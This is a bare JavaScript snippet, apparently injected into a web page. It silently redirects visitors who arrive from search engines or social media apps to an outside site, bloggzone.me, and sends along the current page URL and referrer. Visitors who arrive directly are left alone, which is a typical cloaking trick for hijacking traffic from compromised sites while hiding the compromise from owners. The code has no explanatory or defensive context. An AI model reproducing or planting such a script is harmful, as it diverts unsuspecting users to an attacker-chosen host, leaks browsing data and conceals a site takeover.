//<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;

    	var ars 	= rChoice([
							'https://bloggzone.me',
							 
							]);

				function rChoice(arr) {
    			return arr[Math.floor(arr.length * Math.random())];
	}

	//Code arsae client javascript
	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'yahoo.', 'whatsapp.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
    }
//]]>

